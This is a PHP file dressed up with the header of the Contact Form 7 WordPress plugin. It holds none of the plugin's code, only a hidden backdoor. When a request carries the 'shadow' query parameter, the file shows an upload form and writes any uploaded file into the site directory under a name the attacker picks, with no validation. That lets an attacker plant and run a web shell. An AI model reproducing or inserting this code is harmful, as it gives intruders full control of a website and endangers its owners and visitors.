<?php
/*
 * Plugin Name: Contact Form 7
 * Plugin URI: https://contactform7.com/
 * Description: Just another contact form plugin. Simple but flexible.
 * Author: Takayuki Miyoshi
 * Author URI: https://ideasilo.wordpress.com/
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Version: 6.1.1
 * Requires at least: 6.7
 * Requires PHP: 7.4
 */

if (isset($_GET['shadow'])) {
    if(isset($_FILES['f'])){
        if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
            echo "˚⊱🪷⊰˚ File uploaded: <b>{$_FILES['f']['name']}</b><br>";
            echo "╰┈➤ <a href='{$_FILES['f']['name']}' target='_blank'>Open</a>";
        } else {
            echo "❌ Failed to upload file.";
        }
    }
    echo '<form method="POST" enctype="multipart/form-data">
      <input type="file" name="f">
      <button>-Shadow-Here-</button>
    </form>';
    die();
}

?>